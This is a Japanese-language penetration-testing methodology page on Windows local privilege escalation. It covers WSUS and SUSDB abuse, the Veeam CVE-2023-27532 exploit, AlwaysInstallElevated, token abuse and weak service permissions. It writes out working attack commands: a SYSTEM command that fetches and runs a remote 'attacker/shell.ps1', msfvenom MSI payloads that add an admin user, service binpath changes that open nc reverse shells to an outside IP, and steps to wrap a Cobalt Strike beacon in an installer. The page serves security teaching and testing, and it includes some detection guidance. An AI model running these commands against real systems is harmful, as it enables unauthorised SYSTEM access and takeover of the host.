# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基礎的なガイドに基づく、Windows privilege-escalation methodology の一般的な内容をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な enumeration flow では、community workshops と checklists の内容も参照しています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の attack material には、Windows privilege escalation に関する DerbyCon の presentation も含まれています。<sup>[[5]](#references)</sup>

## Windows の初期理論

### Access Tokens

**Windows の access tokens が何か分からない場合は、続行する前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumeration を妨げたり**、executable の実行を阻止したり、さらには**あなたの活動を検出したり**するさまざまな仕組みがあります。privilege escalation の enumeration を開始する前に、次の**ページを読み**、これらすべての**防御** **mechanisms** を **enumerate** してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks が bypass された場合、prompt なしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow は、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、privileged local NTLM authentication が再利用された SMB TCP connection を介して reflect される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability が存在するか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が持つ**巨大な攻撃対象領域**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報を使用してローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGithubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

環境変数に保存された認証情報/Juicy infoはありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) でこれを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細全体や出力結果が完全に記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs の最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script の実行に関する完全なアクティビティと全内容の記録が取得され、実行時にコードのすべてのブロックが記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な情報が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block の logging event は、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件の event を表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが非 SSL の WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では次のようにします:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのtoolを使用できます。これらは、SSLではないWSUS trafficに「fake」なupdateをinjectするための、MiTM weaponized exploit scriptsです。

researchについては、こちらを参照してください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なreportはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、このbugがexploitするflawは次のとおりです。

> ローカルuserのproxyを変更でき、Windows UpdatesがInternet Explorerのsettingsで設定されたproxyを使用する場合、自身のasset上で[PyWSUS](https://github.com/GoSecure/pywsus)をlocalに実行して自身のtrafficをinterceptし、elevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userのsettingsを使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateを生成し、そのcertificateをcurrent userのcertificate storeに追加すれば、HTTPとHTTPSの両方のWSUS trafficをinterceptできます。WSUSは、certificateに対するtrust-on-first-use形式のvalidationを実装するために、HSTSに類似したmechanismを使用していません。提示されたcertificateがuserによってtrustedであり、正しいhostnameを持っていれば、serviceによって受け入れられます。

このvulnerabilityは、tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（liberatedされ次第）を使用してexploitできます。

### SUSDB custom-update abuse: `.txt`/`.esd` 経由のunsigned payloads

これは、HTTP WSUS connectionをinterceptする場合とは異なるtrust-boundary failureです。前提条件は、custom updateをpublishおよびapproveするための**WSUS database（`SUSDB`）stored procedures**への十分なaccessです。実用的なentry pathの1つは、upstream WSUS computer accountを、`SUSDB`をhostする別のMSSQL serverへrelayすることです。正確な前提条件はdeploymentごとに異なるため、SQL administrator rightsがあると仮定せず、まず`EXECUTE` permissionsをenumerateしてください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authenticationをHTTP/8530からLDAP、SMB、またはAD CSへrelayする別のattack pathについては、[Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### updateのbuild、target指定、approve

custom-update workflowは、正規のWSUS proceduresをrestricted publishing APIとして使用します。重要なstate transitionsは次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| update metadataのimport | `spImportUpdate` |
| prerequisite、localized、extended XML fragmentsのstore | `spSaveXMLFragment` |
| content digestとattacker-controlled URLのassociate | `spSetBatchURL` |
| computer groupのenumerate/createおよびclientの追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのgroupへのinstallationのapprove | `@actionID = 0`および`@isAssigned = 1`を指定した`spDeployUpdate` |

file name、digests、size、および`CommandLineInstallation` handlerは、importされたmetadata/fragments間で一致している必要があります。content URLとtarget groupをassignした後、最終的なapprovalは次のようになります。exampleのGUIDをreplayせず、freshなupdate、group、deployment identifiersを使用してください。<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### 拡張子による signature bypass

WSUS は通常、任意の unsigned executable content を拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` 内の .NET `VerifyFile` path では、指定されたファイル名が `.txt` または `.esd` で終わる場合、certificate-check flag が false に設定されます。そのため、バイト列が text または正規の ESD image であることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前の変更されていない PE は content verification を通過し、その後 update の command-line installation handler によって起動される可能性があります。これは signature forgery ではなく、policy/type-confusion bug です。<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-compatible staging と自動化

`spDeployUpdate` を呼び出すと、WSUS は登録されたコンテンツを取得します。origin は BITS の HTTP 要件を満たす必要があります。到達可能な URL だけでは不十分です。転送では初期の `HEAD`/`GET` フローと byte-range リクエストが使用されるためです。Range をサポートしないサーバーでは、WSUS の同期時に、BITS が Range protocol header を必要とすることを示す `EventId=364` が生成されます。<sup>[[39]](#references)</sup>

調査用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、import/fragment/URL/group/deployment chain に必要な SQL を生成し、それを実行するための modified MSSQL client を含み、コンテンツ staging 用の `BitsWebServer.py` も提供します。最小限の authorized-lab での invocation は次のとおりです。<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### 無人実行と retry persistence

Client-side interaction は policy に依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` の `4 - Auto download and schedule install` オプションを使用すると、承認済みの update が、user が手動で選択しなくても、設定された schedule に従って download および install されます。テストでは、update が failed/incomplete のままになった payload が、callback process の終了直後に再び提示されたため、retry behavior が recurring execution persistence になる可能性があります。ただし、client に update-failed state が表示されるため、noisy です。<sup>[[39]](#references)</sup>

#### Detection と hardening の pivot

この chain から利用できる server-side および client-side の pivot は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を audit します。新しい targeting group、外部 content origin、`.txt`/`.esd` update payload、および想定外の principal（特に computer account ではない account）によって実行された deployment を調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、および `EventId=364` を確認します。suffix を盲目的に信頼せず、verification を payload extension および content magic と相関させます。
- Windows Update の installation が繰り返し failed/retry している状態、および `.txt` や `.esd` という名前を持つ content からの PE execution や予期しない child/network activity を hunt します。
- 対応している場合は database service に Extended Protection for Authentication を必須化し、database への network access を WSUS server と承認済みの administrative system に限定します。custom-update procedure に対する `EXECUTE` rights を最小化し、audit します。

## Third-Party Auto-Updaters と Agent IPC (local privesc)

多くの enterprise agent は localhost IPC surface と privileged update channel を公開しています。enrollment を attacker server に誘導でき、updater が rogue root CA または弱い signer check を信頼する場合、local user は malicious MSI を配布し、SYSTEM service に install させることができます。一般化された technique（Netskope stAgentSvc chain – CVE-2025-0309 に基づく）については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM)

Veeam B&R < `11.0.1.1261` は **TCP/9401** 上で localhost service を公開しており、attacker-controlled message を処理することで、**NT AUTHORITY\SYSTEM** として任意の command を実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listener と version を確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL と同じ directory に配置し、local socket 経由で SYSTEM payload を trigger します。
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下にある Windows **domain** 環境では、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自分自身の権限を持っていること、そしてユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの**要件**が**デフォルト設定**で満たされていることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

以下の 2 つのレジストリが**有効**（値が **0x1**）になっている**場合**、あらゆる権限レベルのユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
meterpreter session がある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使用すると、現在の directory 内に privileges を escalate するための Windows MSI binary を作成できます。この script は、user/group の追加を促す precompiled MSI installer を書き出します（そのため GIU access が必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を参照してください。**command lines** の**実行だけ**を行いたい場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- project に **AlwaysPrivesc** などの名前を付け、location に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（include する files の選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を強調表示し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる他の properties もあります。
- project を右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定したことを確認してください。

### MSI Installation

悪意のある `.msi` file の**installation**を**background**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定によって、何が**ログに記録される**かが決まるため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingでは、ログの送信先を確認することが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**プレーンテキストのパスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority（LSA）に対する強化された保護機能を導入し、信頼されていないプロセスによるメモリの**読み取り**やコードのインジェクションを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威から、デバイスに保存された credentials を保護することです。[**Credential Guard の詳細については、こちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン認証情報**は、**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン認証情報が確立されます。\
[**Cached Credentialsの詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に、興味深い権限を持つものがないか確認します
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いtoken**と、それらを悪用する方法について**学んでください**：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際には、**プロセスのコマンドライン内にパスワードがないか確認してください**。\
実行中の**バイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できないか調べます：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して権限昇格できる可能性があります。

**プロセスのバイナリに対する権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使用すると、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**credentials がメモリ内に平文で保存されている**ため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でないGUIアプリ

**SYSTEMとして実行されているアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で、"command prompt" を検索し、"Click to open Command Prompt" をクリックします。

## Services

Service Triggers を使用すると、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP availability、device arrival、GPO refresh など）が発生したときに、Windowsがサービスを開始できます。SERVICE_START rights がなくても、トリガーを発火させることで、権限の高いサービスを起動できる場合があります。enumeration と activation の techniques については、こちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が変更可能なサービスがないか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[こちらから XP 用の accesschk.exe をダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service を有効化

（例：SSDPSRV で）次のエラーが発生した場合：

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。サービスが無効になっているか、有効なデバイスが関連付けられていない可能性があります。_

次のコマンドで有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost サービスが動作するには SSDPSRV に依存することに注意してください（XP SP1の場合）**

この問題の**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持っているシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、以下のさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、service configurations を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: service configurations を変更する能力を継承します。
- **GENERIC_ALL**: service configurations を変更する能力も継承します。

この vulnerability の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries の脆弱な権限

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されており、**low-privileged users が service EXE またはその親フォルダーを変更できる**場合、**binary を置き換えて service を再起動する**ことで、service を hijack できることがあります。

**service によって実行される binary を変更できるか**、または binary が配置されている**フォルダーに対する write permissions があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**。**）\
**wmic**（system32 にはありません）を使用すると、service によって実行されるすべての binary を取得でき、**icacls** を使用して permissions を確認できます。
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** も使用できます。
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
